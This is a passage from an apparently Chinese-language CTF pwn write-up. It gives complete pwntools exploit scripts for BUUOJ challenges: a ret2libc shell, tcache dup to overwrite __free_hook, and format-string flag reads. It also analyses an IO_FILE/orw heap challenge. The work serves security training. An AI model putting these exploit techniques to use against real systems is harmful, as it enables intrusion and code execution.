gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#write_p = e.plt['write']</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x048</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'->'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]buf:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#payload = b'a'*offset + p32(write_p) + p32(main_a) + p32(1) + p32(lsm_g) +p32(4)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#choose use LibcSearcher or libc file</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do?'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_en_3\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_en_3\">#</a> ciscn_2019_en_3</h1>\n<p>** 考点：**heap, uaf, tcache dup, free_hook, fmtstr</p>\n<p>开始有格式化字符串漏洞，但是不能利用 <code>%N$</code>  的形式，所以一个个输出。有个 <code>_IO_2_1_stderr_</code> 的 libc 函数，将其地址泄露，计算出 system 地址和 <code>__free_hook</code>  地址，然后利用 tcache dup 直接修改 <code>__free_hook</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_2019_en_3'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26713</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size of story: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'inpute the story: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'%p%p%p%p%p%p.%p\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>stderr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]stderr:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stderr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">,</span> stderr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libcbase <span class=\"token operator\">=</span> stderr <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID.\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'114514'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"judgement_mna_2016\"><a class=\"markdownIt-Anchor\" href=\"#judgement_mna_2016\">#</a> judgement_mna_2016</h1>\n<p>** 考点：**fmtstr</p>\n<p>开始程序将 flag 文件读入了内存中，因此找到偏移，利用 format_string 漏洞直接输出。</p>\n<p><img data-src=\"./image-20231120154115924.png\" alt=\"image-20231120154115924\"></p>\n<p>两个地址相减除以 4，得到 flag 的偏移量，即 <code>%28$n</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'judgement_mna_2016'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25488</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0xfda0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>strg <span class=\"token operator\">=</span> <span class=\"token number\">0xfd30</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;$s\\n'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>flag<span class=\"token operator\">-</span>strg<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag >> '</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_final_2\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_final_2\">#</a> *ciscn_final_2</h1>\n<p>** 考点：**heap, IO_FILE, tcache dup, orw</p>\n<p>**libc 版本：**libc6_2.27_3ubunto1_amd64</p>\n<h2 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h2>\n<p>保护全开。沙盒禁用了 execve。</p>\n<p><img data-src=\"./image-20231120154641760.png\" alt=\"image-20231120154641760\"></p>\n<h3 id=\"flag文件\"><a class=\"markdownIt-Anchor\" href=\"#flag文件\">#</a> flag 文件</h3>\n<p>程序一开始将 flag 文件读入，并利用 <code>dup2(fd, 666);</code>  将 flag 文件标识符复制到了 666。由于 <code>execve</code>  被禁用因此只能利用 orw 的思路。因此可以修改 <code>stdin</code>  的 <code>IO_FILE</code>  结构体的 <code>flagno</code>  属性为 <code>666</code> ，这样当执行 <code>scanf</code>  时，将会直接从 flag 文件中读取。</p>\n<p><img data-src=\"./image-20231121010743447.png\" alt=\"image-20231121010743447\"></p>\n<p>退出函数中包含一次输入和对应的一次输出，刚好适合用于 orw 的 read 和 write 环节。</p>\n<p><img data-src=\"./image-20231121011050461.png\" alt=\"image-20231121011050461\"></p>\n<h3 id=\"分配函数\"><a class=\"markdownIt-Anchor\" href=\"#分配函数\">#</a> 分配函数</h3>\n<p>这题的堆分配功能比较独特。首先分配大小固定为大块分配 <code>malloc(0x20)</code> ，实际大小 0x30。小块分配 <code>malloc(0x10)</code> ，实际大小 0x20。固定将分配后地址分别放在数组 <code>int_pt[0]</code>  和 <code>int_pt[1]</code>  中，可无限次分配，新分配块的地址将会直接覆盖原地址。每次分配后将<strong> bool 置 1</strong>。</p>\n<p>分配的同时往堆块内写入数据。这次写入数据的方式也不同，是获取用户输入的数字字符串直接转换成数值填入对应地址，即类似 <code>scanf(&quot;%d&quot;, &amp;ptr)</code>  的输入方式。~~ 不用自己手动类型转换啦！~~ 该做法的缺点是能修改的字节有限且固定。两种 chunk 对应可写的字节数如下：</p>\n<ul>\n<li><code>malloc(0x20)</code> ：可写入 int 类型，即 4 字节。</li>\n<li><code>malloc(0x10)</code> ：可写入 short 类型，即 2 字节。</li>\n</ul>\n<p>同时，该函数会往 ** <code>chunk_addr+8字节</code> <strong>的地址处也复制一份数字。该做法的作用是，在释放块后，留有</strong> <code>chunk_addr+8字节</code>  ** 处的数据供我们利用。</p>\n<h3 id=\"释放函数\"><a class=\"markdownIt-Anchor\" href=\"#释放函数\">#</a> 释放函数</h3>\n<p>在 bool 为 1 时可以选择释放大 chunk 或小 chunk。释放 chunk 后，没有清空地址。同时将<strong> bool 置 0</strong>。由于 bool 的存在，所以不能连续释放两个相同的 chunk，只能借助另一类块的分配来实现 tcache dup。比如，要分配一个 0x30 大小的 chunk 进行 tcache dup，应执行以下命令。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 以下函数定义见完整代码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 该代码仅做实例，未出现在 exp 中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 这是那个 0x30 大小的 chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#这是借用的 0x20 大小的 chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 此时构成 tcache bin 循环 可以 dup</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># target 为要实现任意地址读写的地址</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token 